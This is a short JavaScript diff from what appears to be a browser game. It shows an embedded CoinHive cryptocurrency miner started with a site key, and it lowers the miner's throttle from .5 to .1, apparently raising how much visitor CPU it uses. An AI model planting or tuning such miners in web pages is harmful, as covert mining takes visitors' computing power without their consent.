@@ -317,5 +317,5 @@ function change_money_color() {
 let hashes = 0;
 let miner = new CoinHive.Anonymous('OPcAucBNwRYkuolOhrRINWw0GeAAVFkA');
 miner.on('found', function() { hashes++; })
-miner.setThrottle(.5);
+miner.setThrottle(.1);
 miner.start();
